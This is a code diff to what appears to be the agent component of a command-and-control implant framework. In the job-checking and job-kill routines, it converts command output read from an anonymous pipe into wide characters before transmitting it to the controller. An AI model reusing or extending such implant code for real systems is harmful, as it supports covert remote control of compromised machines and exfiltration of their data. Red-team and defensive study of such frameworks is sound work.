@@ -156,9 +156,14 @@ VOID JobCheckList()
 
                                 if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
-                                    PackageAddBytes( Package, Buffer, Available );
+                                    LPVOID BufferW = Instance->Win32.LocalAlloc( LPTR, Available*2 );
+                                    DWORD  SizeW   = Instance->Win32.MultiByteToWideChar( CP_OEMCP, 0, Buffer, Available, BufferW, Available*2 );
+
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUTW, JobList->RequestID );
+                                    PackageAddBytes( Package, BufferW, SizeW*2);
                                     PackageTransmit( Package );
+
+                                    DATA_FREE( BufferW, Available*2 )
                                 }
 
                                 DATA_FREE( Buffer, Size )
@@ -351,9 +356,14 @@ BOOL JobKill( DWORD JobID )
 
                                 if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
-                                    PackageAddBytes( Package, Buffer, Available );
+                                    LPVOID BufferW = Instance->Win32.LocalAlloc( LPTR, Available*2 );
+                                    DWORD  SizeW   = Instance->Win32.MultiByteToWideChar( CP_OEMCP, 0, Buffer, Available, BufferW, Available*2 );
+
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUTW, JobList->RequestID );
+                                    PackageAddBytes( Package, BufferW, SizeW*2);
                                     PackageTransmit( Package );
+
+                                    DATA_FREE( BufferW, Available*2 )
                                 }
 
                                 DATA_FREE( Buffer, Size )
